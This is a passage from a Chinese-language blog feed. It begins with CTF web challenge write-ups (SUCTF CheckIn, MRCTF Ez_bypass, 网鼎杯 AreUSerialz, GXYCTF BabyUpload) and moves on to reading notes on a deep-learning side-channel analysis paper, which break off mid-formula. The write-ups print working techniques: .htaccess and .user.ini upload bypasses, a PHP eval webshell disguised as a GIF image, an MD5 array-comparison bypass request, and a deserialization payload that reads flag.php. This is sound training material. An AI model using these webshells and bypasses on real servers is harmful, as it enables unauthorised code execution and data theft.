<p>考察.htaccess绕过,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;goodimg.png&quot;&gt;  </span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;  </span><br><span class="line"># 将goodimg.png读取为php文件</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"># 将以.jpg结尾的文件读取为php</span><br></pre></td></tr></table></figure>
<p>直接上传一个png文件 修改如下, <strong>filename</strong>改为.htaccess上传覆盖</p>
<p><img src="../img/image-20220907155335976.png" alt="image-20220907155335976"></p>
<p>上传之后,再次上传名为goodimg的png图片,里边包含一个🐴</p>
<p><img src="../img/image-20220907155635092.png" alt="image-20220907155635092"></p>
<p>上传后获得url, 直接蚁剑getshell</p>
<h2 id="SUCTF-2019-CheckIn">[SUCTF 2019]CheckIn</h2>
<p><img src="../img/image-20220907170414202.png" alt="demo"></p>
<p>上传绕过, 检测了<code>&lt;?</code> 用script绕过,构造如下:</p>
<p><strong>contentCheck.png</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt; @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>GIF89a是绕过文件头检测</p>
<p>再次上传.user.ini文件 构造如下:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attr">auto_prepend_file</span>=contentCheck.png  // 这样所有的php文件都会包含contentCheck.png的内容</span><br></pre></td></tr></table></figure>
<p><img src="../img/image-20220908162700627.png" alt="image-20220908162700627"></p>
<p>题目很明显提醒我们他自己本身有一个index.php 所以遇到这种就要往user.ini或者htaccess上边靠,直接蚁剑连接得到flag</p>
<h2 id="MRCTF2020-Ez-bypass">[MRCTF2020]Ez_bypass</h2>
<p>源码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
<p>考察php弱类型比较跟php的md5函数特性, 利用数组可以很容易地绕过md5函数的强弱比较</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?gg[]=1&amp;id[]=2 HTTP/1.1</span><br><span class="line">Host: c74e5515-5a79-4ae5-965e-c670fc82a27f.node4.buuoj.cn:81</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>is_valid会传入的参数进行过滤, 必须要求ascii码在32到125之间</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到题中给出的变量属性位protected 这样序列化出来的参数显示不出来 <code>*</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;*op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">11</span>:<span class="string">&quot;*filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;*content&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>将属性置为public即可通过isvaild,下一步执行析构函数__destruct</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里<code>$this-&gt;op === &quot;2&quot;</code>是一个强类型比较,而process函数里<code>$this-&gt;op == &quot;2&quot;</code>是一个弱类型, 那就直接传入数值型2,即可绕过强等于判断,而若比较也可以通过,这样就跳入read函数,payload如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传入 <code>str=O:11:%22FileHandler%22:3&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:8:%22flag.php%22;s:7:%22content%22;s:3:%22123%22;&#125;</code>查看源码即可getflag</p>
<h2 id="GXYCTF2019-BabyUpload">[GXYCTF2019]BabyUpload</h2>
<p><img src="../img/image-20220908171604539.png" alt="image-20220908171604539"></p>
<p>依旧是.htaccess应用, 检测了文件类型, 文件结尾,文件内容 先上传htaccess</p>
<p>先上传.htaccess</p>
<p><img src="../img/image-20220908171936397.png" alt="image-20220908171936397"></p>
<p>再上传goodimg.jpeg</p>
<p><img src="../img/image-20220908172059427.png" alt="image-20220908172059427"></p>
<p>直接访问goodimg的路径,getflag</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Exploring Feature Selection Scenarios for Deep Learning-based Side-channel Analysis</title>
    <url>/archives/e366992f.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>作者：Guilherme Perin<sup>1,2</sup>, Lichao Wu<sup>2</sup> and Stjepan Picek<sup>1</sup></li>
<li>单位：
<ul>
<li>1 Radboud University, Nijmegen, The Netherlands <a href="mailto:picek.stjepan@gmail.com">picek.stjepan@gmail.com</a></li>
<li>2 Delft University of Technology, Delft, The Netherlands {G.Perin,L.Wu-4}@tudelft.nl</li>
</ul>
</li>
<li>出处：IACR Transactions on Cryptographic Hardware and Embedded Systems</li>
<li>标题：<strong>Exploring Feature Selection Scenarios for Deep Learning-based Side-channel Analysis</strong></li>
</ul>
<h1>文章内容</h1>
<h2 id="研究背景">研究背景</h2>
<p>近年来，深度学习技术在侧信道攻击（Side Channel Attack，SCA）领域取得了显著的进展，侧信道分析是一种通过对加密设备的物理特性（如功耗、电磁辐射等）来推断密钥信息的方法。一般而言，侧信道攻击需要人为挑选特征区间，即从大量的时间样本点中挑选与密钥相关的部分。这就要求攻击者在建模阶段之前的随机掩码已知，以此来计算信噪比等相关指标。</p>
<blockquote>
<p>例如在ASCAD数据集上，攻击已经修剪好的700个样本点时，尽管研究者们在建模、攻击阶段避免使用到随机掩码的先验知识，但不可避免的是，在使用700个点时，实际上已经默认掩码已知。因为在裁剪这些样本点区间时，原作者利用到了掩码的知识来完成信噪比的计算，以此来挑选出了与密钥相关的这部分。</p>
</blockquote>
<p>Lu等人<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>首先提出了一种端到端的侧信道攻击方法，堆叠多层不同的神经网络对原始能量迹完成攻击，无需对数据进行特征选择，从而避免使用到有关随机掩码的先验知识。但模型存在复杂度过高的问题，在本文中作者提出利用结构较为简单的模型在无特征选择的条件下来完成攻击。</p>
<p><strong>感知信息（PI）</strong><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>与猜测熵和成功率应用场景相同，PI也被用作评估模型的好坏，以此来衡量模型可以从样本点中获取多少有用的信息，并通过样本数量来计算攻击的复杂度。PI的计算公式如下：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mrow><mi>P</mi><mi>I</mi></mrow><mo stretchy="true">^</mo></mover><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>+</mo><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mfrac><mn>1</mn><msub><mi>N</mi><mi>y</mi></msub></mfrac><munderover><mo>∑</mo><mi>i</mi><msub><mi>N</mi><mi>y</mi></msub></munderover><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mover accent="true"><mi>p</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>y</mi><mo>∣</mo><msubsup><mi>x</mi><mi>i</mi><mi>y</mi></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\widehat{PI}(X,Y)=H(Y)+\sum_{y\in{Y}}p(y)\frac{1}{N_y}\sum_{i}^{N_y}\log_2\hat{p}(y\mid{x_{i}^{y}})
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9833em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span><span class="svg-align" style="top:-3.6833em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.3em;"><svg xmlns="http://www.w3.org/2000/svg" width='100%' height='0.3em' viewBox='0 0 2364 300' preserveAspectRatio='none'><path d='M1181 0h2l1171 176c6 0 10 5 10 11l-2 23c-1 6-5 10
-11 10h-1L1182 67 15 220h-1c-6 0-10-4-11-10l-2-23c-1-6 4-11 10-11z'/></svg></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:3.3671em;vertical-align:-1.4304em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8557em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4304em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.9367em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.4083em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">p</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>p</mi><mo>^</mo></mover><mo stretchy="false">(</mo><mi>y</mi><mo>∣</mo><msubsup><mi>x</mi><mi>i</mi><mi>y</mi></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat{p}(y\mid{x_{i}^{y}})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">p</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.1667em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" 